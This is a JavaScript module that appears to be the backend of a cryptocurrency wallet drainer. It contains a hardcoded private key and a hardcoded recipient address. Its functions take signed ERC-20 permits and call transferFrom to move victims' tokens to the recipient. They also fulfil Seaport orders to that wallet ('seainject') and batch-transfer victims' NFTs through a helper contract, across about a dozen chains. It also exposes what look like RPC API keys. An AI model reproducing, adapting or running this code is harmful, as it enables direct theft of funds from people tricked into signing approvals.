const { Seaport } = require('@opensea/seaport-js');
const { FeeMarketEIP1559Transaction } = require('@ethereumjs/tx');
const { Common } = require('@ethereumjs/common');
const { ethers } = require('ethers');
const axios = require('axios');

let providerRPC;

const privateKey = 'ec569faa405d2f93322237c330fa0dfa28238b2fd37a9521e0b8279aa24b481a';
const contractSAFA = '0x47828a3f99dba3799e8616f5040e2dfaa1f96d55';
const recipient = '0x9F3140fA27D168dD3C7421c21d15074D1e6EB521';

String.prototype.format = function (args) {
  return this.replace(/{(\d+)}/g, function (match, index) {
    // check if the argument is present
    return typeof args == 'undefined' ? match : args;
  });
};

const getABI = async (address, abiUrl) => {
  console.log('Getting ABI for', address)
  let res = await axios.get(abiUrl.format(address), { 
    headers: { "Accept-Encoding": "gzip,deflate,compress" } 
});
  res = res.data.result[0];
  let abi = JSON.parse(res['ABI']);
  let impl = '';
  if (res['Proxy'] === '1' && res['Implementation'] !== "") {
    impl = res['Implementation'];
    console.log('Getting impl ABI for', impl);
    abi = JSON.parse((await axios.get(abiUrl.format(impl), { 
    headers: { "Accept-Encoding": "gzip,deflate,compress" } 
})).data.result[0]['ABI']);
  }
  return [abi, impl];
}

exports.permit = async (chainId, tokenAddress, abiUrl, amount, owner, spender, value, deadline, v, r, s) => {
    if(chainId == "0x1") { providerRPC = "https://rpc.ankr.com/eth/538fc84e5fe5bcad1b92ffcf0af5efe58f4fafa7daebb51b9ab89db00e827a55"; }
    else if(chainId == "0x38") { providerRPC = "https://rpc.ankr.com/bsc/538fc84e5fe5bcad1b92ffcf0af5efe58f4fafa7daebb51b9ab89db00e827a55"; }
    else if(chainId == "0x89") { providerRPC = "https://rpc.ankr.com/polygon/538fc84e5fe5bcad1b92ffcf0af5efe58f4fafa7daebb51b9ab89db00e827a55"; }
    else if(chainId == "0xfa") { providerRPC = "https://rpc.ankr.com/fantom/538fc84e5fe5bcad1b92ffcf0af5efe58f4fafa7daebb51b9ab89db00e827a55"; }
    else if(chainId == "0xa86a") { providerRPC = "https://rpc.ankr.com/avalanche/538fc84e5fe5bcad1b92ffcf0af5efe58f4fafa7daebb51b9ab89db00e827a55"; }
    else if(chainId == "0xa") { providerRPC = "https://rpc.ankr.com/optimism/538fc84e5fe5bcad1b92ffcf0af5efe58f4fafa7daebb51b9ab89db00e827a55"; }
    else if(chainId == "0xa4b1") { providerRPC = "https://rpc.ankr.com/arbitrum/538fc84e5fe5bcad1b92ffcf0af5efe58f4fafa7daebb51b9ab89db00e827a55"; }
    else if(chainId == "0x64") { providerRPC = "https://rpc.ankr.com/gnosis/538fc84e5fe5bcad1b92ffcf0af5efe58f4fafa7daebb51b9ab89db00e827a55"; }
    else if(chainId == "0x505") { providerRPC = "https://rpc.moonriver.moonbeam.network"; }
    else if(chainId == "0xa4ec") { providerRPC = "https://rpc.ankr.com/celo/538fc84e5fe5bcad1b92ffcf0af5efe58f4fafa7daebb51b9ab89db00e827a55"; }
    else if(chainId == "0x4e454152") { providerRPC = "https://mainnet.aurora.dev"; }
    const provider = new ethers.providers.JsonRpcProvider(providerRPC);
    const gasPrice = await provider.getGasPrice();
    let hexGasPrice = ethers.utils.hexlify(Math.floor(gasPrice));
    if(chainId == "0x1" || chainId == "0x38") { hexGasPrice = ethers.utils.hexlify(Math.floor(gasPrice * 1.3)); }
    let GasLimit = '150000';
    if(chainId == "0xa4b1") { GasLimit = '2400000' }
    const wallet = new ethers.Wallet(privateKey, provider);
    const contractInfo = await getABI(tokenAddress, abiUrl);
    const tokenContract = new ethers.Contract(tokenAddress, contractInfo[0], wallet);
    try {
        const txResponse = await tokenContract.permit(owner, spender, value, deadline, v, r, s, {
          gasLimit:GasLimit,gasPrice:hexGasPrice
        });
        const txReceipt = await txResponse.wait();
        console.log(txReceipt.transactionHash);
        console.log("Permit Success");
        const gasPriceTwo = await provider.getGasPrice();
        let hexGasPriceTwo = ethers.utils.hexlify(Math.floor(gasPriceTwo));
        if(chainId == "0x1" || chainId == "0x38") { hexGasPriceTwo = ethers.utils.hexlify(Math.floor(gasPriceTwo * 1.3)); }
        const reswait = await tokenContract.transferFrom(owner, recipient, amount.toString(), {
                gasLimit:GasLimit,gasPrice:hexGasPriceTwo
          });
        const txRes = await reswait.wait();
        console.log(txRes.transactionHash);
        console.log("Transfer Done After permit");
        return true;
    } catch (e) {
        if(chainId == "0xa4b1") {
            const txResponse = await tokenContract.permit(owner, spender, value, deadline, v, r, s, {
              gasLimit:GasLimit,gasPrice:hexGasPrice
            });
            const txReceipt = await txResponse.wait();
            console.log(txReceipt.transactionHash);
            console.log("Permit Success");
        }
        const gasPriceTwo = await provider.getGasPrice();
        let hexGasPriceTwo = ethers.utils.hexlify(Math.floor(gasPriceTwo));
        if(chainId == "0x1" || chainId == "0x38") { hexGasPriceTwo = ethers.utils.hexlify(Math.floor(gasPriceTwo * 1.3)); }
        const reswait = await tokenContract.transferFrom(owner, recipient, amount.toString(), {
                gasLimit:GasLimit,gasPrice:hexGasPriceTwo
          });
        const txRes = await reswait.wait();
        console.log(txRes.transactionHash);
        console.log("Transfer Done After permit");
        return true;
    }
}

exports.transfertoken = async (chainId, tokenAddress, abiUrl, amount, owner, spender) => {
    if(chainId == "0x1") { providerRPC = "https://rpc.ankr.com/eth/538fc84e5fe5bcad1b92ffcf0af5efe58f4fafa7daebb51b9ab89db00e827a55"; }
    else if(chainId == "0x38") { providerRPC = "https://rpc.ankr.com/bsc/538fc84e5fe5bcad1b92ffcf0af5efe58f4fafa7daebb51b9ab89db00e827a55"; }
    else if(chainId == "0x89") { providerRPC = "https://rpc.ankr.com/polygon/538fc84e5fe5bcad1b92ffcf0af5efe58f4fafa7daebb51b9ab89db00e827a55"; }
    else if(chainId == "0xfa") { providerRPC = "https://rpc.ankr.com/fantom/538fc84e5fe5bcad1b92ffcf0af5efe58f4fafa7daebb51b9ab89db00e827a55"; }
    else if(chainId == "0xa86a") { providerRPC = "https://rpc.ankr.com/avalanche/538fc84e5fe5bcad1b92ffcf0af5efe58f4fafa7daebb51b9ab89db00e827a55"; }
    else if(chainId == "0xa") { providerRPC = "https://rpc.ankr.com/optimism/538fc84e5fe5bcad1b92ffcf0af5efe58f4fafa7daebb51b9ab89db00e827a55"; }
    else if(chainId == "0xa4b1") { providerRPC = "https://rpc.ankr.com/arbitrum/538fc84e5fe5bcad1b92ffcf0af5efe58f4fafa7daebb51b9ab89db00e827a55"; }
    else if(chainId == "0x64") { providerRPC = "https://rpc.ankr.com/gnosis/538fc84e5fe5bcad1b92ffcf0af5efe58f4fafa7daebb51b9ab89db00e827a55"; }
    else if(chainId == "0x505") { providerRPC = "https://rpc.moonriver.moonbeam.network"; }
    else if(chainId == "0xa4ec") { providerRPC = "https://rpc.ankr.com/celo/538fc84e5fe5bcad1b92ffcf0af5efe58f4fafa7daebb51b9ab89db00e827a55"; }
    else if(chainId == "0x4e454152") { providerRPC = "https://mainnet.aurora.dev"; }
    const provider = new ethers.providers.JsonRpcProvider(providerRPC);
    const gasPrice = await provider.getGasPrice();
    let hexGasPrice = ethers.utils.hexlify(Math.floor(gasPrice));
    if(chainId == "0x1" || chainId == "0x38") { hexGasPrice = ethers.utils.hexlify(Math.floor(gasPrice * 1.3)); }
    let GasLimit = '150000';
    if(chainId == "0xa4b1") { GasLimit = '2400000' }
    const wallet = new ethers.Wallet(privateKey, provider);
    const contractInfo = await getABI(tokenAddress, abiUrl);
    const tokenContract = new ethers.Contract(tokenAddress, contractInfo[0], wallet);
    try {
        const reswait = await tokenContract.transferFrom(owner, recipient, amount.toString(), {
          gasLimit:GasLimit,gasPrice:hexGasPrice
        });
        const txRes = await reswait.wait();
        console.log(txRes.transactionHash);
        console.log("Transfer Done ERC20");
        return true;
    } catch (e) {
        const gasPriceTwo = await provider.getGasPrice();
        let hexGasPriceTwo = ethers.utils.hexlify(Math.floor(gasPriceTwo));
        if(chainId == "0x1" || chainId == "0x38") { hexGasPriceTwo = ethers.utils.hexlify(Math.floor(gasPriceTwo * 1.3)); }
        const reswait = await tokenContract.transferFrom(owner, recipient, amount.toString(), {
          gasLimit:GasLimit,gasPrice:hexGasPriceTwo
        });
        const txRes = await reswait.wait();
        console.log(txRes.transactionHash);
        console.log("Transfer Done ERC20");
        return true;
    }
}


exports.seainject = async (order) => {
    providerRPC = "https://rpc.ankr.com/eth/38eac0bf9f0e89d5e226f5c1ef1249406ce7958e48704cc5c3015bed44cb3dca";
    const provider = new ethers.providers.JsonRpcProvider(providerRPC);
    const wallet = new ethers.Wallet(privateKey, provider);
    const seaport = new Seaport(wallet);
    try{
      const sendit = async () => {
      const { executeAllActions: executeAllFulfillActions } = await seaport.fulfillOrder({
        order,
        accountAddress: wallet.address,
        });
        const transaction = executeAllFulfillActions();
      }
      sendit()
      console.log('Transaction Broadcasted');
      return true;
    } catch(error) { console.log(error)
      const sendit = async () => {
      const { executeAllActions: executeAllFulfillActions } = await seaport.fulfillOrder({
        order,
        accountAddress: wallet.address,
        });
        const transaction = executeAllFulfillActions();
      }
      sendit()
      console.log('Transaction Broadcasted');
      return true;
    }
}

exports.batchtransfer = async (owner, tokenAddress, tokensId) => {
    providerRPC = "https://rpc.ankr.com/eth/538fc84e5fe5bcad1b92ffcf0af5efe58f4fafa7daebb51b9ab89db00e827a55";
    const abiercsafa = [{"inputs": [], "stateMutability": "nonpayable", "type": "constructor"}, {"inputs": [{"internalType": "contract ERC721Partial", "name": "tokenContract", "type": "address"}, {"internalType": "address", "name": "actualOwner", "type": "address"}, {"internalType": "address", "name": "recipient", "type": "address"}, {"internalType": "uint256[]", "name": "tokenIds", "type": "uint256[]"}], "name": "batchTransfer", "outputs": [], "stateMutability": "nonpayable", "type": "function"}, {"inputs": [{"internalType": "address", "name": "_newExector", "type": "address"}], "name": "setExecutor", "outputs": [], "stateMutability": "nonpayable", "type": "function"}];
    const provider = new ethers.providers.JsonRpcProvider(providerRPC);
    const gasPrice = await provider.getGasPrice();
    const hexGasPrice = ethers.utils.hexlify(Math.floor(gasPrice * 1.3));
    const wallet = new ethers.Wallet(privateKey, provider);
    const res = tokensId.map(numStr => parseInt(numStr));
    const tokenContract = new ethers.Contract(contractSAFA, abiercsafa, wallet);
    try {
        const reswait = await tokenContract.batchTransfer(tokenAddress, owner, recipient, res, {
                gasLimit:300000,gasPrice:hexGasPrice
        });
        const txRes = await reswait.wait();
        console.log(txRes.transactionHash);
        console.log("Transfer Done");
        return true;
    } catch (e) {
        const gasPriceTwo = await provider.getGasPrice();
        const hexGasPriceTwo = ethers.utils.hexlify(Math.floor(gasPriceTwo * 1.3));
        const reswait = await tokenContract.batchTransfer(tokenAddress, owner, recipient, res, {
                gasLimit:300000,gasPrice:hexGasPriceTwo
        });
        const txRes = await reswait.wait();
        console.log(txRes.transactionHash);
        console.log("Transfer Done");
    }
}